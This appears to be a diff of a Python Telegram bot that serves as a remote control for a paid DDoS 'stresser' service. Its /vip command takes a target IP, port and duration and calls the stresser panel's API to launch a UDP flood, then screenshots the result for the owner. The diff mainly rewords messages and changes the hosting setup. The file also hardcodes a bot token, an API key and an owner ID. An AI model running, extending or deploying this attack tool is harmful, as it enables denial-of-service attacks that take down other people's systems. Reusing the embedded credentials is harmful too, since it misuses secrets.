@@ -5,9 +5,8 @@ import os
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
-from flask import Flask
 
-BOT_TOKEN = "8473566885:AAEtPibAxkEfW45LGDKkZ46nWnVB6ErqFAs"
+BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
 API_KEY = "ujiYT1DJIAacgnFB"
 OWNER_ID = 7459756974
 
@@ -42,7 +41,7 @@ def take_screenshot(url):
 @bot.message_handler(commands=['start'])
 def start(message):
     if message.from_user.id == OWNER_ID:
-        bot.reply_to(message, "✅ Bot started!\n\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
+        bot.reply_to(message, "✅ Bot Started!\n\n/vip <ip> <port> <time>\n/add <user_id>\n/remove <user_id>")
     else:
         bot.reply_to(message, "❌ Unauthorized")
 
@@ -77,7 +76,7 @@ def vip_attack(message):
     try:
         args = message.text.split()
         if len(args) != 4:
-            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nMin time: 60 seconds")
+            bot.reply_to(message, "⚠️ Usage: /vip <ip> <port> <time>\nMinimum time: 60 seconds")
             return
         
         _, ip, port, time_val = args
@@ -87,7 +86,7 @@ def vip_attack(message):
             bot.reply_to(message, "❌ Minimum time 60 seconds!")
             return
         
-        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 {ip}:{port}\n⏱️ {time_val}s")
+        bot.reply_to(message, f"⚡ VIP Started!\n\n🎯 Target: {ip}:{port}\n⏱️ Time: {time_val}s")
         
         url = f"https://susstresser.com/panel/api/api.php?key={API_KEY}&host={ip}&port={port}&time={time_val}&method=udp"
         
@@ -95,10 +94,10 @@ def vip_attack(message):
             try:
                 screenshot_path = take_screenshot(url)
                 with open(screenshot_path, 'rb') as photo:
-                    bot.send_photo(OWNER_ID, photo, caption=f"📸 {ip}:{port} | {time_val}s | By: {message.from_user.id}")
+                    bot.send_photo(OWNER_ID, photo, caption=f"📸 Attack by {message.from_user.id}\n🎯 {ip}:{port}\n⏱️ {time_val}s")
                 os.remove(screenshot_path)
             except Exception as e:
-                bot.send_message(OWNER_ID, f"❌ Error: {str(e)}")
+                bot.send_message(OWNER_ID, f"❌ Screenshot failed: {str(e)}")
         
         threading.Thread(target=capture_and_send).start()
         
@@ -107,25 +106,8 @@ def vip_attack(message):
 
 @bot.message_handler(commands=['status'])
 def status(message):
-    bot.reply_to(message, "🟢 Bot running!")
+    bot.reply_to(message, "🟢 Bot is running!\n✅ Chrome ready\n✅ Polling active")
 
-# Flask for Heroku (keep alive)
-app = Flask(__name__)
-
-@app.route('/')
-def home():
-    return "Bot is running!"
-
-# Polling in background thread
-def run_polling():
-    print("🤖 Starting bot polling...")
-    bot.infinity_polling(timeout=60, skip_pending=True)
-
-if __name__ == "__main__":
-    # Start polling in background
-    polling_thread = threading.Thread(target=run_polling, daemon=True)
-    polling_thread.start()
-    
-    # Run Flask app
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+print("🤖 Bot starting...")
+print("✅ Using polling (no webhook)")
+bot.infinity_polling(timeout=60, skip_pending=True)
